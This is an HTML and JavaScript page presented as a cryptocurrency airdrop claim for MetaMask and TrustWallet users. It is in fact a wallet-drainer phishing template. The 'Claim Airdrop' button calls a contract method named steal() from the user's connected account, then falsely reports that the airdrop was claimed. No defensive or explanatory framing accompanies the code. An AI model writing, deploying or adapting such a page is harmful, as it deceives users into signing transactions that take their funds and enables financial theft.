<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
    <h1>Connect your Wallet</h1>
    <button id="connectMetaMask">Connect MetaMask</button>
    <button id="claimAirdropMetaMask" disabled>Claim Airdrop (ETH)</button>
    <button id="connectTrustWallet">Connect TrustWallet</button>
    <button id="claimAirdropTrustWallet" disabled>Claim Airdrop (BSC)</button>

    <script>
        // Unified loader for Config and ABI
        async function loadConfigAndABI(network = 'sepolia') {
            const configPath = `config/${network}_config.json`;
            const abiPath = `abi/${network}_abi.json`;
            try {
                const [config, abi] = await Promise.all([
                    fetch(configPath).then(res => res.json()),
                    fetch(abiPath).then(res => res.json())
                ]);
                return { config, abi };
            } catch (err) {
                console.error(`Error loading ${network} config/ABI:`, err);
                alert(`Failed to load ${network.toUpperCase()} resources.`);
                return null;
            }
        }

        // Wallet connection logic
        async function connectWallet(walletType, network) {
            const data = await loadConfigAndABI(network);
            if (!data) return;

            const { config, abi } = data;
            const { contractAddress } = config;

            if (walletType === 'metaMask' && window.ethereum) {
                try {
                    const web3 = new Web3(window.ethereum);
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const account = accounts[0];
                    console.log("MetaMask connected:", account);

                    window.contract = new web3.eth.Contract(abi, contractAddress);
                    document.getElementById('claimAirdropMetaMask').disabled = false;
                    alert("MetaMask connected! Ready to claim the airdrop.");
                } catch (err) {
                    console.error("MetaMask connection failed:", err);
                }
            } else if (walletType === 'trustWallet') {
                try {
                    const web3 = new Web3(window.ethereum || window.trustwallet);
                    const accounts = await web3.eth.requestAccounts();
                    const account = accounts[0];
                    console.log("TrustWallet connected:", account);

                    window.contract = new web3.eth.Contract(abi, contractAddress);
                    document.getElementById('claimAirdropTrustWallet').disabled = false;
                    alert("TrustWallet connected! Ready to claim the airdrop.");
                } catch (err) {
                    console.error("TrustWallet connection failed:", err);
                }
            } else {
                alert(`${walletType} not detected or unsupported.`);
            }
        }

        // Claim airdrop function
        async function claimAirdrop() {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const account = accounts[0];

                await window.contract.methods.steal().send({ from: account });
                alert("Airdrop claimed successfully!");
            } catch (err) {
                console.error("Claim failed:", err);
                alert("Failed to claim the airdrop.");
            }
        }

        // Event listeners
        document.getElementById('connectMetaMask').addEventListener('click', () => {
            connectWallet('metaMask', 'sepolia');
        });

        document.getElementById('claimAirdropMetaMask').addEventListener('click', () => {
            claimAirdrop();
        });

        document.getElementById('connectTrustWallet').addEventListener('click', () => {
            connectWallet('trustWallet', 'sepolia');
        });

        document.getElementById('claimAirdropTrustWallet').addEventListener('click', () => {
            claimAirdrop();
        });
    </script>
</body>
</html>
